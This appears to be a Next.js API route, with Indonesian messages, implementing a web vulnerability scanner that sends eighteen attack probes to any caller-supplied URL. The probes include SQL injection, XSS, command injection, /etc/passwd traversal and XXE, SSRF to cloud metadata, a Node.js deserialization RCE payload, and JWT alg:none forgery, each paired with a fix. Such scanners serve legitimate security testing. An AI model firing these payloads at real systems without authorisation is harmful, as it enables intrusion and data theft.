// pages/api/scan.js
import axios from 'axios';

export default async function handler(req, res) {
  const { target } = req.query;
  if (!target) {
    return res.status(400).json({ error: 'Target URL required' });
  }

  const results = [];

  // 1. SQL Injection
  try {
    const payload = "' OR '1'='1";
    const response = await axios.get(target, { params: { id: payload } });
    if (response.data.includes('SQL syntax') || response.data.includes('mysql_fetch')) {
      results.push({
        vulnerability: 'SQL Injection',
        exploitation: `Mengirim payload: ${payload} lewat parameter id menghasilkan error SQL.`,
        fix: 'Gunakan prepared statements atau parameterized queries.'
      });
    } else {
      results.push({
        vulnerability: 'SQL Injection',
        exploitation: `Payload ${payload} tidak menghasilkan error, namun uji lebih lanjut dengan sqlmap.`,
        fix: 'Gunakan prepared statements.'
      });
    }
  } catch (e) {}

  // 2. Cross-Site Scripting (XSS)
  try {
    const payload = '<script>alert(1)</script>';
    const response = await axios.get(target, { params: { search: payload } });
    if (response.data.includes(payload)) {
      results.push({
        vulnerability: 'Cross-Site Scripting (XSS)',
        exploitation: `Payload ${payload} direfleksikan tanpa sanitasi.`,
        fix: 'Lakukan HTML entity encoding terhadap semua output dari pengguna.'
      });
    }
  } catch (e) {}

  // 3. Command Injection
  try {
    const payload = '; ls';
    const response = await axios.get(target, { params: { cmd: payload } });
    if (response.data.includes('bin') || response.data.includes('etc')) {
      results.push({
        vulnerability: 'Command Injection',
        exploitation: `Payload ${payload} menampilkan listing direktori.`,
        fix: 'Jangan menjalankan perintah shell dari input pengguna. Gunakan whitelist perintah.'
      });
    }
  } catch (e) {}

  // 4. Directory Traversal
  try {
    const payload = '../../../../etc/passwd';
    const response = await axios.get(target, { params: { file: payload } });
    if (response.data.includes('root:')) {
      results.push({
        vulnerability: 'Directory Traversal',
        exploitation: `Berhasil membaca /etc/passwd dengan parameter file.`,
        fix: 'Batasi akses direktori dan sanitasi path.'
      });
    }
  } catch (e) {}

  // 5. Open Redirect
  try {
    const payload = 'https://evil.com';
    const response = await axios.get(target, { params: { redirect: payload }, maxRedirects: 0, validateStatus: () => true });
    if (response.status === 302 && response.headers.location === payload) {
      results.push({
        vulnerability: 'Open Redirect',
        exploitation: `Parameter redirect langsung dialihkan ke ${payload}.`,
        fix: 'Validasi URL redirect dengan whitelist domain yang diizinkan.'
      });
    }
  } catch (e) {}

  // 6. Server-Side Request Forgery (SSRF)
  try {
    const internalUrl = 'http://169.254.169.254/latest/meta-data/';
    const response = await axios.get(target, { params: { url: internalUrl } });
    if (response.data.includes('ami-id') || response.data.includes('instance-id')) {
      results.push({
        vulnerability: 'Server-Side Request Forgery (SSRF)',
        exploitation: `Mengakses metadata AWS melalui parameter url: ${internalUrl}.`,
        fix: 'Blokir akses ke alamat internal/private, gunakan whitelist URL eksternal.'
      });
    }
  } catch (e) {}

  // 7. Local File Inclusion (LFI) dengan wrapper PHP
  try {
    const payload = 'php://filter/convert.base64-encode/resource=index.php';
    const response = await axios.get(target, { params: { page: payload } });
    if (response.data.match(/^[A-Za-z0-9+/=]+$/)) {
      results.push({
        vulnerability: 'Local File Inclusion (LFI)',
        exploitation: `Menggunakan wrapper php://filter untuk membaca source code.`,
        fix: 'Nonaktifkan allow_url_include dan sanitasi parameter file.'
      });
    }
  } catch (e) {}

  // 8. Insecure Deserialization (Node.js)
  try {
    const payload = '{"rce":"_$$ND_FUNC$$_function (){return require(\'child_process\').execSync(\'id\').toString();}()"}';
    const response = await axios.post(target, { data: payload }, { headers: { 'Content-Type': 'application/json' } });
    if (response.data.includes('uid=')) {
      results.push({
        vulnerability: 'Insecure Deserialization (Node.js)',
        exploitation: `Payload Node.js deserialization berhasil menjalankan perintah id.`,
        fix: 'Jangan menggunakan eval() atau unserialize pada data yang tidak tepercaya. Gunakan JSON.parse dengan hati-hati.'
      });
    }
  } catch (e) {}

  // 9. CORS Misconfiguration
  try {
    const origin = 'https://evil.com';
    const response = await axios.get(target, { headers: { Origin: origin } });
    if (response.headers['access-control-allow-origin'] === origin) {
      results.push({
        vulnerability: 'CORS Misconfiguration',
        exploitation: `Server mengizinkan Origin ${origin} mengakses resource, memungkinkan serangan cross-origin.`,
        fix: 'Konfigurasi Access-Control-Allow-Origin hanya untuk domain terpercaya, bukan wildcard untuk origin tertentu.'
      });
    }
  } catch (e) {}

  // 10. Clickjacking
  try {
    const response = await axios.get(target);
    const xFrame = response.headers['x-frame-options'];
    if (!xFrame) {
      results.push({
        vulnerability: 'Clickjacking',
        exploitation: 'Tidak ada header X-Frame-Options, halaman dapat dimuat dalam iframe.',
        fix: 'Tambahkan header X-Frame-Options: DENY atau SAMEORIGIN.'
      });
    }
  } catch (e) {}

  // 11. Information Disclosure via Server Header
  try {
    const response = await axios.get(target);
    const server = response.headers['server'];
    if (server && server.includes('Apache/2.4.49')) {
      results.push({
        vulnerability: 'Server Information Disclosure & Outdated Software',
        exploitation: `Header Server: ${server} membocorkan versi. Apache 2.4.49 rentan terhadap path traversal dan RCE.`,
        fix: 'Sembunyikan header server atau perbarui ke versi terbaru.'
      });
    }
  } catch (e) {}

  // TEKNIK TERBARU 2026

  // 12. Server-Side Template Injection (SSTI) dengan AI-Generated Payload
  try {
    const sstiPayloads = [
      '{{7*7}}', '${7*7}', '<%= 7*7 %>', '#{7*7}', '{{= 7*7}}'
    ];
    const chosen = sstiPayloads[Math.floor(Math.random() * sstiPayloads.length)];
    const response = await axios.get(target, { params: { name: chosen } });
    if (response.data.includes('49')) {
      results.push({
        vulnerability: 'Server-Side Template Injection (SSTI)',
        exploitation: `Payload ${chosen} menghasilkan 49, menandakan eksekusi template.`,
        fix: 'Hindari interpolasi string dari input pengguna. Gunakan sandbox jika perlu.'
      });
    }
  } catch (e) {}

  // 13. GraphQL Introspection Abuse
  try {
    const introspectionQuery = '{ __schema { types { name } } }';
    const response = await axios.post(`${target}/graphql`, { query: introspectionQuery });
    if (response.data && response.data.data && response.data.data.__schema) {
      results.push({
        vulnerability: 'GraphQL Introspection Enabled',
        exploitation: 'Mendapatkan seluruh skema API melalui introspection query.',
        fix: 'Matikan introspection di production.'
      });
    }
  } catch (e) {}

  // 14. Prototype Pollution via JSON
  try {
    const payload = { "__proto__.polluted": "true" };
    const response = await axios.post(target, payload, { headers: { 'Content-Type': 'application/json' } });
    if (response.data && response.data.polluted === 'true') {
      results.push({
        vulnerability: 'Prototype Pollution',
        exploitation: 'Payload __proto__ berhasil mengubah prototype object.',
        fix: 'Gunakan Object.create(null) atau validasi input dengan ketat.'
      });
    }
  } catch (e) {}

  // 15. XML External Entity (XXE) Injection
  try {
    const xmlPayload = `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>`;
    const response = await axios.post(target, xmlPayload, { headers: { 'Content-Type': 'application/xml' } });
    if (response.data.includes('root:')) {
      results.push({
        vulnerability: 'XML External Entity (XXE) Injection',
        exploitation: 'Membaca file /etc/passwd melalui entitas XML.',
        fix: 'Nonaktifkan pemrosesan DTD eksternal pada parser XML.'
      });
    }
  } catch (e) {}

  // 16. Web Cache Poisoning via X-Forwarded-Host
  try {
    const poisonedHost = 'evil.com';
    const response = await axios.get(target, { headers: { 'X-Forwarded-Host': poisonedHost } });
    if (response.data.includes(poisonedHost) && response.status === 200) {
      results.push({
        vulnerability: 'Web Cache Poisoning',
        exploitation: `Header X-Forwarded-Host: ${poisonedHost} tercermin dalam halaman dan mungkin di-cache.`,
        fix: 'Jangan mempercayai header X-Forwarded-Host secara buta. Atur konfigurasi caching dengan tepat.'
      });
    }
  } catch (e) {}

  // 17. JWT None Algorithm Attack (if token present)
  try {
    const initialRes = await axios.get(target);
    const token = initialRes.data.token || initialRes.headers.authorization?.replace('Bearer ', '');
    if (token) {
      const [headerB64, payloadB64, sig] = token.split('.');
      const newHeader = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64url');
      const forgedToken = `${newHeader}.${payloadB64}.`;
      const res2 = await axios.get(target, { headers: { Authorization: `Bearer ${forgedToken}` } });
      if (res2.status === 200 && JSON.stringify(res2.data) !== JSON.stringify(initialRes.data)) {
        results.push({
          vulnerability: 'JWT None Algorithm Attack',
          exploitation: 'Token berhasil diverifikasi tanpa signature, memungkinkan pemalsuan payload.',
          fix: 'Pastikan server menolak token dengan algoritma none.'
        });
      }
    }
  } catch (e) {}

  // 18. Subdomain Takeover via CNAME dangling
  try {
    const urlObj = new URL(target);
    const domain = urlObj.hostname;
    const response = await axios.get(target);
    if (response.data.includes('NoSuchBucket') || response.data.includes('There isn\'t a GitHub Pages site here.')) {
      results.push({
        vulnerability: 'Subdomain Takeover Possible',
        exploitation: `Halaman menampilkan pesan layanan tidak terkonfigurasi, mungkin subdomain bisa diambil alih.`,
        fix: 'Hapus DNS record yang menunjuk ke service yang sudah tidak digunakan.'
      });
    }
  } catch (e) {}

  res.status(200).json(results);
}
